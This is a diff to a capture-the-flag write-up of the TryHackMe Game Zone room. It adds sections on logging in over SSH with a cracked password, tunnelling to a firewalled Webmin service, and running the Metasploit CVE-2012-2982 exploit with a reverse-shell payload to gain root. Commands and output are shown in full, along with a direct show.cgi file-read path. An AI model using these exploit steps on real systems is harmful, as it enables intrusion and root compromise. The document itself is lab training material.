@@ -68,7 +68,7 @@ where
 
 -dump : dump the entire database.
 
-This yeilds the following
+This yields the following
 
 ```
 (dspo6㉿kali)[~/pentest/boxes/thm/game_zone]$ sqlmap -r sqlrequest.txt -dbms mysql -dump
@@ -301,6 +301,251 @@ PS D:\Google Drive\Cyber Security\Utils\hashcat-6.1.1>
 So this shows that the password is `videogamer124`
 
 
+## Using Found Credentials with SSH
 
+We will now try the found credentials to log in using SSH and they work.
+
+```
+(dspo6㉿kali)[~/pentest/boxes/thm/game_zone]$ ssh agent47@10.10.108.67
+The authenticity of host '10.10.108.67 (10.10.108.67)' can't be established.
+ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.108.67' (ECDSA) to the list of known hosts.
+agent47@10.10.108.67's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+109 packages can be updated.
+68 updates are security updates.
+
+
+Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
+agent47@gamezone:~$ 
+```
+
+Using the `ss` command to dump socket statistics, we see the following:-
+
+```
+agent47@gamezone:~$ ss -tulpn
+Netid State      Recv-Q Send-Q                              Local Address:Port                                             Peer Address:Port              
+udp   UNCONN     0      0                                               *:10000                                                       *:*                  
+udp   UNCONN     0      0                                               *:68                                                          *:*                  
+tcp   LISTEN     0      128                                             *:22                                                          *:*                  
+tcp   LISTEN     0      80                                      127.0.0.1:3306                                                        *:*                  
+tcp   LISTEN     0      128                                             *:10000                                                       *:*                  
+tcp   LISTEN     0      128                                            :::22                                                         :::*                  
+tcp   LISTEN     0      128                                            :::80                                                         :::*                  
+agent47@gamezone:~$ 
+```
+
+Note that there is a TCP port 10000 open. 
+
+One thing that I do not understand about this room is the following statement:-
+
+> We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). 
+
+I was unable to run the iptables command when logged in as agent47, presumably because that user is not root. In any case we will continue and exploit this port using an SSH tunnel. 
+
+## SSH Tunnel
+
+Creating an SSH tunnel, will allow us to forward traffic on the port 10000 to a port on our PC. 
+
+```
+(dspo6㉿kali)[~]$ ssh -L 10000:localhost:10000 agent47@10.10.27.3
+The authenticity of host '10.10.27.3 (10.10.27.3)' can't be established.
+ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.27.3' (ECDSA) to the list of known hosts.
+agent47@10.10.27.3's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+109 packages can be updated.
+68 updates are security updates.
+
+
+Last login: Sat Feb 20 16:57:39 2021 from 10.2.2.175
+agent47@gamezone:~$ 
+
+```
+Now when we go to our browser and navigate to the site with port 10000 we see a login page.
+
+![](/assets/img/2021-02-22_6-20-43.jpg)
+
+**Note:** The first few times, I tried this I was not able to view this page. It turned out that I still have the proxy for Burpsuite enabled in the browser - lesson learned. 
+
+
+Logging in with the credentials we found earlier, we are brought to a Webmin version 1.580 page.
+
+![](/assets/2021-02-22_6-28-11.jpg)
+
+## Escalation
+
+Search the Exploit DB, we find [CVE-2012-2982](https://www.exploit-db.com/exploits/21851) which turns out to be a Metasploit exploit. 
+
+**Note:** During this phase, we need to leaave the tunnel open. 
+
+Firing up Metasploit, we can search for "CVE-2012-2982" and then use the resulting exploit. We then need to choose the payload of `cmd/unix/reverse` and enter the options. 
+
+
+```
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show options
+
+Module options (exploit/unix/webapp/webmin_show_cgi_exec):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD  videogamer124    yes       Webmin Password
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS    localhost        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT     10000            yes       The target port (TCP)
+   SSL       true             yes       Use SSL
+   USERNAME  agent47          yes       Webmin Username
+   VHOST                      no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.2.2.175       yes       The listen address (an interface may be specified)
+   LPORT  9002             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Webmin 1.580
+
+
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > 
+
+```
+
+The first time I ran this, the exploit failed
+
+```
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run
+[*] Exploiting target 0.0.0.1
+
+[*] Started reverse TCP double handler on 10.2.2.175:9002 
+[*] Attempting to login...
+[-] Authentication failed
+[*] Exploiting target 127.0.0.1
+[*] Started reverse TCP double handler on 10.2.2.175:9002 
+[*] Attempting to login...
+[-] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=error: wrong version number
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > 
+```
+
+The reason for this is that I had the SSL option set to `true`. I set this to `false` and tried again.
+
+```
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show options
+
+Module options (exploit/unix/webapp/webmin_show_cgi_exec):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD  videogamer124    yes       Webmin Password
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS    localhost        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT     10000            yes       The target port (TCP)
+   SSL       false            yes       Use SSL
+   USERNAME  agent47          yes       Webmin Username
+   VHOST                      no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.2.2.175       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Webmin 1.580
+
+
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run
+[*] Exploiting target 0.0.0.1
+
+[*] Started reverse TCP double handler on 10.2.2.175:4444 
+[*] Attempting to login...
+[-] Authentication failed
+[*] Exploiting target 127.0.0.1
+[*] Started reverse TCP double handler on 10.2.2.175:4444 
+[*] Attempting to login...
+[+] Authentication successfully
+[+] Authentication successfully
+[*] Attempting to execute the payload...
+[+] Payload executed successfully
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo NQHi2CZk6m646Ep7;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "NQHi2CZk6m646Ep7\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 1 opened (10.2.2.175:4444 -> 10.10.27.3:41238) at 2021-02-20 18:49:06 -0500
+[*] Session 1 created in the background.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > 
+```
+
+We now have a shell and can naviagate to the flag.
+
+```
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type            Information  Connection
+  --  ----  ----            -----------  ----------
+  1         shell cmd/unix               10.2.2.175:4444 -> 10.10.27.3:41238 (127.0.0.1)
+
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > sessions -i 1
+[*] Starting interaction with 1...
+
+
+pwd
+/usr/share/webmin/file/
+cd /root
+ls
+root.txt
+cat root.txt
+a4b945830xxxxxxxxxxxxxxxxxxxxxx
+```
+
+### Alternate Escalation Method
+
+When I originally couldn't get the Metapsploit exploit to work because of the wrong SSL setting, I did a bit of Googling and found some information on using the method mentioned in the Expoit DB entry. 
+
+> The vulnerability exists in the /file/show.cgi component and allows an authenticated user, with access to the File Manager Module, 
+> to execute arbitrary commands with root privileges.
+
+I discovered that navigating to `http://127.0.0.1:10000/file/show.cgi/root/root.txt` would also display the flag. 
+
+
+## Conclusion
+
+This was an intersting room to try. I had never used the SSH tunnel method before. 
+
+I do wish that there was more explanation on how the decision was made to use an SSH tunnel to bypass the firewall. 
 
 
